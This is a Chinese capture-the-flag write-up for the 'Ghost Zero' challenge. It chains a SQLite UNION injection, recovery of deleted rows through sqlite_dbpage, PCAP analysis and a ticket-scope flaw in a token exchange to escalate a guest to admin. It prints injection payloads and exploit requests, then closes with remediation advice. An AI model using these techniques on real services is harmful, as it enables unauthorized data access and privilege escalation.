# Ghost Zero

## 题目简述

题目只给出一句提示：

> Born of light, lost to shadow～.

访问靶机后可以看到一个只提供搜索功能的 “BLACKSITE INDEX”。前端声称所有搜索都通过加密通道发送。最终利用链由三个问题组成：

1. 搜索参数存在 SQLite UNION 注入；
2. SQLite 的 `sqlite_dbpage` 虚表允许读取数据库原始页，从未清零的空闲区恢复出一条已经删除的 PCAP 记录；
3. PCAP 暴露了遗留认证接口。普通 guest 可以从该接口取得 `scope=session` 的合法票据，而票据兑换接口没有将票据 scope、主体和目标权限正确绑定，最终把它兑换成 `role=admin` 的访问令牌。

本题最终 flag 为：

```text
d3ctf{S3ArCHF0R-h1dDEn-zeRO-GHO5t_Int3RFACE_Cr@ck1TR1GHTyeah0}
```

## 解题过程

### 1. 还原前端加密传输

首页加载的主脚本只负责界面，真正的网络逻辑位于：

```text
/assets/crypto.worker-DW2VSort.js
```

Worker 的初始化过程如下：

1. `POST /api/session/guest`，取得 guest RS256 JWT；
2. 浏览器生成一对 P-256 ECDH 临时密钥；
3. 将公钥 JWK 发送至 `POST /api/transport/bootstrap`；
4. 服务端返回 `sid`、服务端 P-256 公钥和 HKDF salt；
5. 双方计算 ECDH 共享秘密；
6. 以 HKDF-SHA256 分别派生两个 AES-256-GCM 密钥：

```text
info = "ghost-packet:c2s"
info = "ghost-packet:s2c"
```

每次网关请求的明文为：

```json
{
  "target": "search",
  "body": {
    "q": "搜索内容"
  }
}
```

请求 AAD 是字段按字典序排列、无多余空格的 canonical JSON：

```json
{
  "direction": "c2s",
  "seq": 1,
  "sid": "...",
  "ts": 1784989512000,
  "v": 1
}
```

最终向 `POST /api/gateway` 发送：

```json
{
  "v": 1,
  "sid": "...",
  "seq": 1,
  "ts": 1784989512000,
  "iv": "base64url...",
  "ct": "base64url..."
}
```

响应使用反方向的 `s2c` 密钥和 AAD 解密。`solve.py` 中的 `GhostClient` 完整实现了这套协议，因此后续可以直接调用：

```python
result = client.request("search", {"q": payload})
```

这里的加密只保护传输包格式，不会修复服务端业务中的 SQL 注入。

### 2. 确认三列 UNION 注入

输入单引号会触发数据库错误，而下面的 payload 可以正常返回结果：

```sql
' OR 1=1 --
```

继续确认原查询有三列：

```sql
' UNION SELECT 0,'probe','probe' --
```

结果对象中的三个字段分别对应 `id`、`title`、`summary`。于是可以查询 SQLite schema：

```sql
' UNION SELECT 0,name,sql
FROM sqlite_master
WHERE type='table' --
```

得到四张表：

```sql
CREATE TABLE User (
  id INTEGER PRIMARY KEY,
  username TEXT NOT NULL,
  hash TEXT NOT NULL
);

CREATE TABLE knowledge_base (
  id INTEGER PRIMARY KEY,
  title TEXT NOT NULL,
  summary TEXT NOT NULL
);

CREATE TABLE "logs??" (
  id INTEGER PRIMARY KEY,
  "text???" TEXT NOT NULL
);

CREATE TABLE "q_8f3c1a72d90e4b65" (
  id INTEGER PRIMARY KEY,
  "r4" TEXT NOT NULL
);
```

`logs??` 中的 Base64 分段按顺序解码后是：

```text
ddd{th15_ isfl@gd3foru}!!!is taht rellay?
```

它既不是正确的 `d3ctf{...}` 格式，文本还直接提示 “is that really?”，显然是诱饵。`User.hash` 中的随机 Base64 字符串也不参与最终认证链。

最后一张表保存了四个普通流量抓包的元数据，但表内并没有题目名 `Ghost_Zero` 对应的记录。结合题目中的 “lost to shadow”，这里应该继续检查已经删除、但尚未被数据库覆盖的数据。

### 3. 通过 sqlite_dbpage 恢复删除记录

当前 SQLite 构建启用了 `sqlite_dbpage` 虚表。它可直接读取数据库每一页的原始字节：

```sql
' UNION ALL SELECT pgno,'sqlite_dbpage',hex(data)
FROM sqlite_dbpage --
```

按 `pgno` 排序并拼接返回的十六进制数据，可重组出一个 20480 字节的 SQLite 数据库。虽然逻辑查询只能看到 `q_8f3c1a72d90e4b65` 中的四条现存记录，但第 5 页的空闲区域仍保留了被删除记录的正文：

```json
{
  "tag": "Ghost_Zero",
  "deleted": true,
  "storagePath": "/app/data/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap",
  "downloadPath": "/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap",
  "bytes": 3048,
  "sha256": "1829670b437f5d952df05bb7b4440772372e83c22ec799452d5da08a7957204b"
}
```

下载 `downloadPath` 后，脚本同时检查文件长度与 SHA-256：

```text
size   = 3048
sha256 = 1829670b437f5d952df05bb7b4440772372e83c22ec799452d5da08a7957204b
```

两者都与删除记录一致，证明恢复出的路径和抓包没有被篡改。

### 4. 分析删除的 PCAP

`analyze_pcap.py` 直接解析 Ethernet、IPv4、TCP 和 HTTP，不要求额外安装 Wireshark 或 Scapy。抓包中的主机为：

```text
legacy-api.internal:8080
```

关键请求是：

```http
POST /ddddddtestStat HTTP/1.1
Host: legacy-api.internal:8080
Content-Type: application/json

{"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}
```

响应给出一枚 `grantType=legacy-bootstrap` 的 exchange ticket，随后客户端将其提交到：

```http
POST /api/auth/exchange HTTP/1.1
Content-Type: application/json

{
  "ticket": "...",
  "grantType": "legacy-bootstrap"
}
```

历史抓包中的 ticket 声明为：

```json
{
  "typ": "ticket",
  "scope": "admin-bootstrap",
  "sub": "ops-root",
  "iss": "ghost-packet-auth",
  "aud": "ghost-packet-ticket"
}
```

兑换后的历史 access token 则包含：

```json
{
  "typ": "access",
  "role": "admin",
  "sub": "ops-root",
  "iss": "ghost-packet-auth",
  "aud": "ghost-packet-api"
}
```

需要注意，抓包中的 JWT 不能直接重放。其签名段 Base64URL 解码后只是：

```text
expired-test-capture-signature
```

时间戳也已经过期。因此这里不应该尝试分解 RSA、伪造 RS256 签名或直接重放旧 token。PCAP 真正提供的是遗留接口名称、请求体结构以及兑换流程。

### 5. 找到加密网关中的隐藏接口

直接请求公开路径 `/ddddddtestStat` 会得到 404。前面已经还原了加密网关，因此尝试把这个路径作为网关的 `target`：

```python
ticket_result = client.request(
    "/ddddddtestStat",
    {
        "principal": "ops-root",
        "mode": "bootstrap",
        "credentialType": "temporary",
    },
)
```

这里有两个容易忽略的细节：

1. 必须通过 `/api/gateway` 的加密传输调用；
2. target 必须是 `"/ddddddtestStat"`，前导斜杠不能省略。

普通 guest 调用后，服务端会用当前 `primary-rs256` 密钥签发一枚有效 ticket。其实际声明并不是 PCAP 中的管理员 scope，而是：

```json
{
  "typ": "ticket",
  "scope": "session",
  "sub": "guest-...",
  "iss": "ghost-packet-auth",
  "aud": "ghost-packet-ticket",
  "iat": 1784989512,
  "exp": 1784989692
}
```

这枚 ticket 本身仍然只是 guest 的 session ticket。

### 6. 利用票据 scope 漂移取得管理员令牌

将刚取得的 guest session ticket 按 PCAP 暴露的遗留流程提交：

```http
POST /api/auth/exchange HTTP/1.1
Content-Type: application/json

{
  "ticket": "<current valid guest session ticket>",
  "grantType": "legacy-bootstrap"
}
```

服务端返回 200，新的 access token 声明为：

```json
{
  "typ": "access",
  "role": "admin",
  "sub": "ops-root",
  "iss": "ghost-packet-auth",
  "aud": "ghost-packet-api",
  "iat": 1784989512,
  "exp": 1784991312
}
```

从输入输出行为可以确认，兑换流程虽然验证了 JWT 的签名和基本票据类型，却没有把输入票据的 `scope=session`、guest 主体和 `legacy-bootstrap` 所授予的管理员权限正确绑定。于是：

```text
guest / scope=session
          |
          | grantType=legacy-bootstrap
          v
ops-root / role=admin
```

这是最终的权限提升点。它不是 JWT 签名绕过，而是票据兑换阶段的授权语义错误。

最后使用管理员 access token：

```http
GET /api/flag HTTP/1.1
Authorization: Bearer <admin access token>
Accept: application/json
```

响应为：

```json
{
  "flag": "d3ctf{S3ArCHF0R-h1dDEn-zeRO-GHO5t_Int3RFACE_Cr@ck1TR1GHTyeah0}"
}
```

### 7. 自动化复现

将前述加密传输、SQL 注入、数据库页重组、PCAP 解析和票据兑换步骤整合后，可直接运行：

```bash
python solve.py "https://<challenge-origin>" --exploit --timeout 30
```

脚本会依次完成：

1. 建立 guest JWT、P-256 ECDH、HKDF、AES-GCM 加密通道；
2. 通过 UNION 注入枚举 schema；
3. 读取并重组 `sqlite_dbpage`；
4. 从原始页恢复已删除的 `Ghost_Zero` 记录；
5. 下载并校验 PCAP；
6. 从 PCAP 提取遗留请求；
7. 调用隐藏网关 target 取得当前有效 guest ticket；
8. 利用 scope 漂移兑换 admin token；
9. 请求 `/api/flag` 并输出 flag。

预期末尾输出：

```text
[+] guest ticket claims: {"typ":"ticket","scope":"session","sub":"guest-...",...}
[+] exchanged access-token claims: {"typ":"access","role":"admin","sub":"ops-root",...}
[+] flag: d3ctf{S3ArCHF0R-h1dDEn-zeRO-GHO5t_Int3RFACE_Cr@ck1TR1GHTyeah0}
```

如果只想离线检查已经恢复的抓包，可执行：

```bash
python analyze_pcap.py recovered.pcap
```

## 方法总结

本题的关键不是某一个高难度密码学攻击，而是把分散在线索链上的多层语义连接起来：

1. 前端的 ECDH 和 AES-GCM 只增加了交互门槛，服务端搜索仍然存在 SQL 注入；
2. 普通表查询看不到目标记录，但 `sqlite_dbpage` 泄露了 SQLite 原始页，删除并不等于数据已经被擦除；
3. 删除的 PCAP 中的 JWT 是故意失效的测试占位符，正确用途是恢复遗留接口协议，而不是直接重放；
4. 隐藏接口只存在于加密网关的 target 分发层，公开 HTTP 路径不可访问；
5. 最终漏洞发生在授权层：`scope=session` 的 guest ticket 被 `legacy-bootstrap` 流程错误提升为 `role=admin`。

防守侧应同时修复这些边界：

- 搜索使用参数化查询，不拼接用户输入；
- 不向非管理员暴露 `sqlite_dbpage` 等数据库内部虚表；
- 删除敏感记录后进行安全清理，抓包等调试制品不进入生产数据目录；
- 隐藏接口也必须执行与公开接口一致的认证授权；
- 票据兑换必须同时校验 `typ`、`scope`、`sub`、`aud`、允许的 grant，以及输出权限与输入权限之间的单调关系，不能仅凭“签名合法”就授予固定管理员身份。
